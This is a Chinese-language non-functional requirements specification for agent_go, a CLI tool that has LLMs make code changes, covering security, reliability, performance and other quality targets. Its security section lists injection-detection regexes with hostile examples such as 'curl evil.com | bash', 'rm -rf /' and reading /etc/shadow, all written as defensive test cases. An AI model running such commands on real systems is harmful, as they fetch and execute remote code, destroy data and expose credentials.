# 非功能需求规格说明 (SPEC-NFR)

> 版本: v1.0
> 日期: 2026-07-24
> 定位: agent_go 跨模块非功能需求 (NFR) 规格，定义系统质量属性的目标、设计机制、SLO、验证方法
> 关联: [SPEC-README](README.md) · [requirements](../design/requirements.md) · [NFR 测试策略](../design/quality/nfr-testing-strategy.md)

---

## 一、概述

本文档定义 agent_go 的 **7 个非功能需求维度**，每个维度包含：目标定义、实现机制（指向具体模块与行号）、可量化阈值 (SLO)、验证方法。

NFR 与功能需求的关键区别：功能需求定义"系统做什么"，NFR 定义"系统做得有多好"。agent_go 作为一个编排 LLM 执行代码变更的 CLI 工具，其 NFR 优先级排序为：

```
安全性 > 可靠性 > 可观测性 > 性能 > 可用性 > 可伸缩性 > 可移植性
```

### NFR 维度总览

| 维度 | 关键词 | 核心 SLO |
|------|--------|----------|
| **安全性** | 沙箱、白名单、审计、凭证隔离 | 验证命令 100% 经白名单校验；API Key 零泄漏 |
| **可靠性** | 降级、重试、中断恢复、异常隔离 | 三层降级兜底率 100%；单点故障不扩散 |
| **可观测性** | 日志、指标、评估报表 | 全阶段 timing 采集；日志-分析 往返可解析 |
| **性能** | 并发、缓存、超时控制 | Plan 缓存命中率 ≥ 80%；并发效率 > 60% |
| **可用性** | CLI 交互、错误消息、无头模式 | 首次使用 5 分钟内可完成一次 run |
| **可伸缩性** | 并发度、依赖图深度、Prompt 截断 | 支持 100 subtask + 10 层依赖的拓扑调度 |
| **可移植性** | 零外部依赖、多供应商、跨平台 | Python 3.10+ 零 pip install |

---

## 二、安全性 (Security)

### 2.1 目标

agent_go 在执行 LLM 生成的验证命令时，必须防止任意代码执行、凭证泄漏、路径穿越和审计缺失。

### 2.2 机制与实现

#### 2.2.1 验证命令 4 阶段白名单 (`agent_go/utils.py:145-257`)

```
Stage 1: shlex 解析      → 拒绝不可解析命令
Stage 2: Shell 注入扫描   → 拒绝 6 类注入模式
Stage 3: 命令+子命令查找  → 拒绝未知命令 (default-deny)
Stage 4: 逐 token 正则校验 → flags 和 positionals 独立验证
```

**6 类 Shell 注入防御** (`utils.py:138-143`):

| 模式 | 正则 | 攻击示例 |
|------|------|----------|
| 命令链 | `[;&]\|\|&&\|\|\|\|` | `pytest ; rm -rf /` |
| 命令替换 `$()` / `` ` `` | `\$\(\|\`[^`]+\`\|\$\{` | `pytest $(whoami)` |
| 管道执行 | `curl\|wget.*\|.*bash` | `curl evil.com \| bash` |
| 危险删除 | `rm\s+-r[^ ]*\s+[/~]` | `rm -rf /` |
| 输出重定向 | `>>?\s*\S` (排除 `2>&1`) | `pytest > /tmp/out` |
| 输入重定向 | `<\s*\S` (排除 `<<`) | `pytest < /etc/shadow` |

**白名单覆盖工具清单** (`utils.py:44-118`): go, pytest, python, python3, npm, npx, yarn, pnpm, cargo, make, mvn, gradle, jest, vitest, mocha, ruff, mypy, black, isort, shellcheck, shfmt, gh, git, deno, phpunit, phpstan, phpcs, rspec, rubocop (28 种工具/别名)

#### 2.2.2 审计日志 (`utils.py:260-289`)

被拒绝的命令写入 `~/.agent_go/verification_audit.jsonl`，每条记录包含:
- `timestamp` — ISO8601 时间戳
- `command` — 被拒绝的命令（截断到 200 字符）
- `reason` — 拒绝原因诊断信息
- `task_id` / `sub_id` — 上下文标识

同时记录到 `logger.warning` 和 `log_event("verification_rejected", ...)` 结构化 JSON 事件。

#### 2.2.3 沙箱环境变量净化 (`executor.py:64-74`)

验证命令执行前构建净化环境：
1. 剔除所有包含 `API_KEY` / `SECRET` / `TOKEN` / `PASSWORD` / `CREDENTIAL` / `PRIVATE_KEY` 的环境变量
2. 排除以 `AGENT_GO_` 为前缀的非敏感变量（如 `AGENT_GO_TASK_ID`）
3. **强制删除** `AGENT_GO_API_KEY`（无论前缀规则如何）

#### 2.2.4 路径穿越防御 (`utils.py:12`)

`read_reference_docs` 在读取用户指定的文档路径前，检查 `path.startswith(repo.resolve())`，拒绝越界访问。

#### 2.2.5 锁文件机制 (`utils.py:292-310`)

`_safe_append_to_file` 使用原子锁文件 (`open(path, "x")`) + 指数退避（max 10 retries） + 原子追加写入，防止并发写入 audit JSONL 时的行交错。

#### 2.2.6 配置文件权限 (`config.py:93`)

`~/.agent_go/config.json` 创建后立即 `os.chmod(0o600)`，仅 owner 可读写。

### 2.3 SLO (Service Level Objectives)

| 指标 | 阈值 | 验证周期 |
|------|------|----------|
| 验证命令白名单覆盖率 | 100%（所有验证命令必经 4-stage 校验） | 每次调用 |
| API Key 泄漏 | 0（验证环境 AND CI 环境均不可见） | 每次 subtask 执行 |
| 路径穿越攻击 | 0（所有文档路径经 `startswith` 锚定检查） | 每次 `read_reference_docs` 调用 |
| 审计日志完整性 | 100%（每次拒绝必写入 JSONL + WARNING + log_event） | 每次拒绝 |
| 配置文件权限 | 必须为 0o600 | 配置创建时 |

### 2.4 验证方法

- **白名单完整性**: 遍历 `_CMD_ARG_RULES` 表，验证每条规则有 `flags` + `positionals` 正则且可编译
- **注入攻防**: 用已知恶意 payload 逐类攻击 `_is_safe_verification_command`，断定为 False
- **审计链路**: `_log_rejected_command` → 检查 `verification_audit.jsonl` 存在且含完整字段
- **沙箱净化**: 模拟 CI/CD 环境变量（GITHUB_TOKEN、CI_JOB_TOKEN 等），验证 `_build_sandbox_env()` 全部剔除

### 2.5 关联模块

- [SPEC-utils.md](SPEC-utils.md) — `_is_safe_verification_command`、`_CMD_ARG_RULES`、`_log_rejected_command`、`_safe_append_to_file`
- [SPEC-executor.md](SPEC-executor.md) — `_build_sandbox_env`、`_apply_resource_limits`
- [SPEC-config.md](SPEC-config.md) — `load_config` 0o600 权限设置

---

## 三、可靠性 (Reliability)

### 3.1 目标

在外部 API 宕机、网络超时、worktree 创建失败、子进程崩溃等异常场景下，系统必须保持可用并能完成任务执行或安全停止。

### 3.2 机制与实现

#### 3.2.1 三层降级 (`api.py:253-283`)

```
Layer 1: 外部 LLM API (Anthropic/OpenAI/DeepSeek)
    ↓ 失败/超时
Layer 2: 本地模型 (localhost:8000/v1/chat/completions, timeout=10s)
    ↓ 失败
Layer 3: 规则匹配 (DECOMPOSE_RULES 关键词命中)
    ↓ 无匹配
单任务兜底 (id="sub-1", agent_prompt=原始任务)
```

**降级触发条件** (`api.py:45,95`):
- API 超时 (60s) / IO 错误
- HTTP 非 2xx 状态码
- JSON 解析失败
- 本地模型不可达或超时 (10s)

#### 3.2.2 中断/恢复 (`pipeline.py:38-134`)

```
SIGINT/SIGTERM 信号
  → _on_interrupt: 置 _interrupted 标志 + SIGKILL 所有 active_pids
  → Wave 边界检测: meta["status"] = "paused", 写 meta.json
  → 恢复 gc.auto 原值
  → sys.exit(0)
  
agent_go resume <task-id>
  → 读取 meta.json → 过滤 completed_ids
  → 从断点继续执行未完成子任务
```

#### 3.2.3 Headless 重试 (`subtask.py:230-273`)

- 最大重试次数: 2 (`MAX_ATTEMPTS`)
- 触发条件: 交互检测 (正则匹配 + 退出码 130) 或超时
- 第二次尝试注入 `RETRY_SUFFIX` 催促指令
- 非交互原因退出 (如 API 超时、退出码 == 0) 不重试

#### 3.2.4 Worktree 降级 (`executor.py:84-99`)

```
git worktree add -b <branch> <path>
    ↓ 失败 (如分支已存在/文件锁定)
git clone <repo> <path> → git checkout -b <branch>
    ↓ 失败
warning 日志记录
```

#### 3.2.5 并发异常隔离 (`pipeline.py:92-117`)

ThreadPoolExecutor 中单个 subtask 的 future 抛异常时:
1. 异常被 `fut.result()` 捕获
2. 构造兜底 result: `status="failed"`, `exit_code=-1`, `verify_ok=False`
3. 其他同 wave subtask 不受影响
4. 异常详情记录到 `logger.error`

#### 3.2.6 清理容错 (`pipeline.py:162-196`)

清理失败 (worktree remove / prune / tag delete / gc.auto 恢复) 均仅记 warning/debug，不抛异常，不阻塞最终报告生成。

### 3.3 SLO

| 指标 | 阈值 | 验证周期 |
|------|------|----------|
| 任务完成率 (含降级) | ≥ 95%（含三层降级的最终成功率） | 每次 run |
| 中断恢复正确性 | 100%（恢复后不重复已完成的 subtask） | 每次 resume |
| 并发异常扩散 | 0（单 subtask 失败不得触发其他 subtask 失败） | 每次并发执行 |
| 清理残留率 | < 5%（worktree/branch/tag 清理后的残留） | 每次 run 结束 |

### 3.4 验证方法

- **降级路径**: mock API 失败 → 验证本地模型被调用 → mock 本地模型失败 → 验证规则匹配结果
- **中断恢复**: SIGINT → 读 meta.json 确认 `status="paused"` → resume → 确认已完成 subtask 未重新执行
- **并发隔离**: 让 3 个并发 subtask 中的 1 个抛异常 → 确认其余 2 个正常完成
- **worktree 降级**: mock `git worktree add` 返回非 0 → 验证 `git clone` 被调用

### 3.5 关联模块

- [SPEC-pipeline.md](SPEC-pipeline.md) — 中断处理、拓扑调度、异常捕获、清理容错
- [SPEC-executor.md](SPEC-executor.md) — worktree 降级、验证重试
- [SPEC-subtask.md](SPEC-subtask.md) — headless 重试、交互检测
- [SPEC-api.md](SPEC-api.md) — 三层降级、超时处理

---

## 四、可观测性 (Observability)

### 4.1 目标

系统必须提供完整的执行过程记录，支持：实时监控、事后回溯、趋势分析、成本归因。

### 4.2 机制与实现

#### 4.2.1 三层数据采集-存储-分析

```
采集层 (metrics.py)      → 存储层 (result.json / execution.log) → 分析层 (eval.py)
  collect_timing()            result.json: timing + change_stats    analyze_quality(Q1-Q8)
  collect_change_stats()      execution.log: JSON event 流          analyze_performance(P1-P6)
  collect_merge_result()      verification_audit.jsonl: 拒绝记录    analyze_cost()
  extract_usage()                                                   analyze_reliability()
                                                                     analyze_ux()
```

#### 4.2.2 阶段 Timing 采集 (`metrics.py:10-18`)

| 阶段 | 字段 | 采集点 |
|------|------|--------|
| worktree 创建 | `worktree_create_ms` | `executor.py:88-89` |
| 上游 merge | `merge_upstream_ms` | `executor.py` merge 前后 |
| Claude 执行 | `claude_execute_ms` | `executor.py` subprocess 前后 |
| 验证执行 | `verification_ms` | `executor.py` 验证循环内 |
| Git commit | `git_commit_ms` | `executor.py` git commit 前后 |

#### 4.2.3 双格式日志 (`config.py:99-116`)

```
# INFO — 人类可读 (控制台 + 文件)
2026-07-24 09:30:45 | INFO     | agent_go.task-xxx | 任务拆解完成，生成 3 个子任务

# DEBUG — 结构化 JSON (仅文件)
2026-07-24 09:30:45 | DEBUG    | agent_go.task-xxx | {"timestamp":"...","event":"plan_complete","step_count":3,...}
```

#### 4.2.4 关键日志事件

| 事件 | 模块 | 用途 |
|------|------|------|
| `plan_complete` | `api.py:245` | Plan 耗时、步数、缓存命中 |
| `plan_generate` | `api.py` | Plan 迭代次数 |
| `api_call` | `api.py` | Token 用量、provider、model |
| `api_error` | `api.py` | API 失败记录 (用于可靠性分析) |
| `subtask_start` / `subtask_complete` | `executor.py:478` | Subtask 生命周期 |
| `subtask_headless_start/complete/retry` | `subtask.py:235,262,246` | Headless 执行详情 |
| `verification_rejected` | `utils.py:270` | 审计安全拒绝 |

#### 4.2.5 分析引擎 (`eval.py`)

| 维度 | 指标 | SLO 参考值 |
|------|------|-----------|
| Quality (Q) | Q1 任务成功率 / Q3 首次通过率 / Q4 验证通过率 | ≥ 80% |
| Performance (P) | P1 端到端耗时 / P3 平均 subtask 耗时 / P6 并发效率 | P6 ≥ 60% |
| Cost | 费用估算 / per-model 拆分 / 缓存命中率 | 缓存命中率 ≥ 50% |
| Reliability | 任务完成率 / sandbox 分布 / 重试率 | 完成率 ≥ 95% |
| UX | 文档使用率 / Agent 多样性 / Skill 使用率 | — |

### 4.3 SLO

| 指标 | 阈值 | 验证周期 |
|------|------|----------|
| 日志事件覆盖率 | 100%（全部关键生命周期阶段有对应事件） | 每次 run |
| 日志 JSON 可解析率 | 100%（`_read_log_events` 可解析所有 log_event 输出） | 持续验证 |
| timing 采集完整性 | 5/5 阶段全部有值 | 每个 subtask |
| 分析报告可生成性 | 100%（有空数据时优雅降级而非异常） | 每次 eval 调用 |

### 4.4 验证方法

- **日志-分析闭环**: `log_event` 写入 → `_read_log_events` 读取 → 解析出正确的事件字段
- **Metrics 完整性**: 检查 `run_subtask` 返回的 result dict 包含全部 5 个 timing 字段 + 6 个 change_stats 字段
- **聚合一致性**: 单任务的 `analyze_quality` 结果与多任务的 `aggregate_quality` 对应指标匹配

### 4.5 关联模块

- [SPEC-metrics.md](SPEC-metrics.md) — 采集函数接口
- [SPEC-eval.md](SPEC-eval.md) — 分析引擎与 CLI 报表
- [SPEC-config.md](SPEC-config.md) — `setup_logger`、`log_event`
- [SPEC-console.md](SPEC-console.md) — 控制台输出抽象

---

## 五、性能 (Performance)

### 5.1 目标

在典型任务（2-5 个 subtask）上，端到端用户体验不应明显慢于手动执行；大规模任务能通过并发获得线性加速。

### 5.2 机制与实现

#### 5.2.1 拓扑波次并发 (`pipeline.py:68-132`)

```
Wave 0: 所有 depends_on=[] 的子任务 → ThreadPoolExecutor(max_workers=min(parallel, len(wave)))
Wave 1: 所有依赖均已完成的子任务 → ThreadPoolExecutor
...
直到所有子任务完成或中断
```

- `--parallel N` 控制并发度
- 无依赖的多个 subtask 在同一个 wave 内并发执行
- 有依赖的 subtask 等待上游 wave 完成后才调度

#### 5.2.2 git gc.auto 禁用 (`pipeline.py:29-36,196`)

并发 worktree 操作共享同一个 git 对象库，`git gc` 可能与 worktree 操作产生竞态。执行前 `git config gc.auto 0`，执行后恢复原值。

#### 5.2.3 Plan 缓存 (`api.py:286-340`)

- 缓存键: `SHA256(task + project_files[:100] + remote + branch)`
- TTL: 86400s (24h，可配置)
- 最大条目: 100 (可配置)
- 缓存文件: `~/.agent_go/cache/plans/<sha256>.json`

#### 5.2.4 超时控制

| 操作 | 超时 | 代码位置 |
|------|------|----------|
| 外部 API 调用 | 60s | `api.py:45` |
| 本地模型调用 | 10s | `api.py:269` |
| Headless Claude 执行 | 120s | `subtask.py:37` (subprocess timeout) |
| git ls-files/find | 5s | `git_utils.py:13,17` |
| tool --version | 10s | `utils.py:372` |

#### 5.2.5 文件截断

| 场景 | 上限 | 代码位置 |
|------|------|----------|
| 参考文档 (单文件) | 15000 字符 | `utils.py:21` |
| 参考文档 (目录中单文件) | 8000 字符 | `utils.py:32` |
| System Prompt | MAX_SYSTEM_PROMPT_CHARS | `api.py:207` |
| User Content | MAX_USER_CONTENT_CHARS | `api.py:211` |

### 5.3 SLO

| 指标 | 阈值 | 验证方法 |
|------|------|----------|
| Plan 缓存命中率 | ≥ 80% (相同 task+repo) | `eval.py analyze_cost` → `cache_hit_rate` |
| 并发效率 (P6) | ≥ 60% (sum(durations) / wall_clock) | `eval.py analyze_performance` |
| 单 subtask 平均耗时 | < 180s (含 Claude 推理 + 验证) | `eval.py analyze_performance` P3 |
| API 超时概率 | < 5% (外部 API 调用中 60s 超时的比例) | 生产监控 |

### 5.4 验证方法

- **缓存命中率**: 对同一 task+repo 连续调用 `generate_plan` 两次 → 第二次不调用 `call_api`
- **并发加速比**: 无依赖的 4 个 subtask，`--parallel 4` 的总耗时 ≤ `--parallel 1` 的 35%
- **gc.auto 生命周期**: 并发执行前 gc.auto=0，执行后恢复原值

### 5.5 关联模块

- [SPEC-pipeline.md](SPEC-pipeline.md) — 拓扑调度、并发执行
- [SPEC-api.md](SPEC-api.md) — Plan 生成、缓存、超时
- [SPEC-git_utils.md](SPEC-git_utils.md) — gc.auto 控制
- [SPEC-subtask.md](SPEC-subtask.md) — Headless 超时

---

## 六、可用性 (Usability)

### 6.1 目标

首次用户在 5 分钟内能从安装到完成第一个任务；有经验的用户在 CI/批量场景可一键完成。

### 6.2 机制与实现

#### 6.2.1 交互式确认流程 (`ui.py`)

```
confirm_plan     → Y(确认) / S(补充) / D(挂载文档) / E(编辑) / R(重新生成) / N(取消)
confirm_subtasks → Y(确认) / N(取消) / E(编辑) / A(追加) / D(删除)
verify_subtask   → C(继续) / R(重试验证) / M(手动修复) / A(放弃)
```

#### 6.2.2 无头模式 (`cli.py`)

`--yes` 标志 + `config.behavior.auto_confirm_*` 配置:
- 跳过 Plan 和子任务确认交互
- `safe_input` 在 EOF 时返回空字符串，触发默认路径
- Console 的 `--quiet` 模式抑制输出

#### 6.2.3 统一输出抽象 (`console.py`)

`Console` 类提供语义化方法，替代裸 `print()`:
- 模式: `quiet` (抑制输出) / `verbose` (调试详情)
- 语义方法: `info` / `success`(✅) / `warning`(⚠️) / `error`(❌) / `debug`(🔍)
- 结构化: `table` / `data` (JSON) / `data_table`
- 布局: `sep` / `title` / `subtitle`

#### 6.2.4 任务管理 CLI

```
agent_go run    <repo> '<task>' [--yes] [--parallel N] [--remote <url>]
agent_go resume <task-id>
agent_go list
agent_go show   <task-id>
agent_go status [--watch]
agent_go clean
agent_go config
agent_go eval   <quality|perf|cost|reliability|ux|all> [task-id|--all]
```

#### 6.2.5 TUI 仪表盘 (`tui.py`)

curses 实时状态面板，支持 `--watch` 持续刷新。

### 6.3 SLO

| 指标 | 阈值 |
|------|------|
| Time-to-first-run | < 5 分钟（安装 Claude Code → 设置 API Key → `agent_go run`） |
| CLI 帮助覆盖 | 100%（所有子命令均有 `--help`） |
| 错误消息可操作性 | 关键错误（无 API Key/无效 repo/依赖循环）提供修复建议 |
| 交互选项可发现性 | Plan/子任务确认阶段选项以单键展示，无需查文档 |

### 6.4 关联模块

- [SPEC-cli.md](SPEC-cli.md) — CLI 解析与命令路由
- [SPEC-ui.md](SPEC-ui.md) — 交互式确认
- [SPEC-console.md](SPEC-console.md) — 输出抽象
- [SPEC-tui.md](SPEC-tui.md) — curses 面板

---

## 七、可伸缩性 (Scalability)

### 7.1 目标

系统支持从单步骤任务到 100 个子任务、10 层依赖图的复杂编排场景。

### 7.2 机制与实现

#### 7.2.1 拓扑波次调度 (`pipeline.py:68-132`)

- 支持任意深度的依赖图 (DAG)
- 每个 wave 内并发度由 `min(parallel, len(wave))` 控制
- ThreadPoolExecutor 可配置 `max_workers`

#### 7.2.2 Prompt 大小控制 (`api.py:207-214`)

- System Prompt 上限: `MAX_SYSTEM_PROMPT_CHARS`
- User Content 上限: `MAX_USER_CONTENT_CHARS`
- 超限自动截断，写入 warning 日志

#### 7.2.3 缓存限制 (`api.py:340`)

- `cache.max_entries`: 最大缓存条目数
- `cache.plan_ttl`: TTL 秒数，过期自动失效
- 缓存目录: `~/.agent_go/cache/plans/`

#### 7.2.4 每个 Subtask 独立落盘 (`pipeline.py:88-90,114-116`)

每个 subtask 完成后立即写 `result.json`，而非等待全部完成后才写 `meta.json`。减少内存驻留，支持从中间断点恢复。

### 7.3 SLO

| 指标 | 阈值 |
|------|------|
| 并发度上限 | `--parallel` 最大 16（受 `ThreadPoolExecutor` + 系统资源约束） |
| 依赖图深度 | 支持 10 层以上 |
| 单任务 subtask 数 | 支持 100 个以上 |
| Prompt 截断安全性 | 100%（截断时写入 warning 并保留核心指令区） |

### 7.4 关联模块

- [SPEC-pipeline.md](SPEC-pipeline.md) — 拓扑调度
- [SPEC-api.md](SPEC-api.md) — Prompt 大小控制、缓存

---

## 八、可移植性 (Portability)

### 8.1 目标

agent_go 在主流 Unix 环境 (Linux/macOS) 上零配置运行，支持多个 LLM 提供商。

### 8.2 机制与实现

#### 8.2.1 零外部 Python 依赖

`pyproject.toml` 不声明任何 `dependencies`。使用 stdlib only:
- `urllib.request` → HTTP API 调用
- `subprocess` → git/claude 子进程
- `json` / `logging` / `pathlib` / `argparse` / `threading` / `signal`

#### 8.2.2 多 LLM 提供商 (`api.py:20-50`)

统一 `call_api()` 接口适配 Anthropic / OpenAI / DeepSeek / Custom 四种提供商，通过 `config.plan_api.provider` 切换。

#### 8.2.3 跨平台兼容

| 平台特性 | 代码位置 | 兼容处理 |
|----------|----------|----------|
| `resource` 模块 | `executor.py:56-61` | `setrlimit` 失败不阻塞 (macOS 不支持 RLIMIT_AS) |
| `shutil.which` | `agents.py:149` | 检测 greywall 是否存在，不存在则降级 native |
| 临时目录 | `task_dir` | 使用 `pathlib.Path` (跨平台路径分隔) |
| Git 命令 | `git_utils.py` | `subprocess.run(["git", ...])` 而非 shell 脚本 |

#### 8.2.4 多语言关键词 (`utils.py:317-339,341-353`)

`_detect_commit_prefix` / `_detect_commit_scope` 同时支持中文和英文关键词:
- 中文: "实现/新增/添加" → `feat`，"修复/修正" → `fix`
- 英文: "add/implement/feature" → `feat`，"fix/bug/hotfix" → `fix`

### 8.3 SLO

| 指标 | 阈值 |
|------|------|
| Python 版本支持 | 3.10 / 3.11 / 3.12 |
| 操作系统支持 | Linux (主要) + macOS (兼容) |
| pip install 步骤 | 0（无外部 Python 依赖） |
| 首次运行依赖 | Claude Code / gh CLI / git (均为系统级工具) |

### 8.4 关联模块

- [SPEC-api.md](SPEC-api.md) — 多供应商适配
- [SPEC-utils.md](SPEC-utils.md) — 多语言关键词检测
- [SPEC-git_utils.md](SPEC-git_utils.md) — 跨平台 git 操作

---

## 九、NFR 交叉影响矩阵

|  | 安全性 | 可靠性 | 可观测性 | 性能 | 可用性 | 可伸缩性 | 可移植性 |
|--|--------|--------|----------|------|--------|----------|----------|
| **安全性** | — | 审计增强降级信任 | 审计日志供分析消费 | 白名单校验微增延迟 | 过于严格可能影响体验 | — | — |
| **可靠性** | 降级路径需审计 | — | retry/log 事件配合 | 重试增加耗时 | 错误消息需清晰 | — | — |
| **可观测性** | — | log 量安全不溢出 | — | 采集有微小开销 | — | — | — |
| **性能** | — | 并发可能加剧竞态 | timing 数据供分析 | — | — | 并行度有平台上限 | — |
| **可用性** | — | — | — | — | — | — | — |
| **可伸缩性** | Prompt 越长注入风险越大 | 大规模需更多降级 | 日志量线性增长 | 并发受 CPU 限制 | TUI 大型任务需分页 | — | — |
| **可移植性** | — | — | — | — | — | — | — |

关键权衡:

1. **安全 vs 可用**: 白名单 default-deny 策略意味着新工具/新参数需要更新规则表，否则验证命令会被拒绝。需要提供清晰的错误消息指导用户添加规则。
2. **可靠性 vs 性能**: 重试 + 超时等待增加 wall-clock 耗时，但避免因瞬态故障重跑整个 pipeline。
3. **可观测性 vs 可伸缩性**: 大规模任务 (100 subtask) 产生大量日志事件，需确保 JSONL 追加写入的性能和日志文件大小可控。

---

## 十、版本历史

| 版本 | 日期 | 变更 |
|------|------|------|
| v1.0 | 2026-07-24 | 初始版本，覆盖 7 个 NFR 维度的完整规格 |
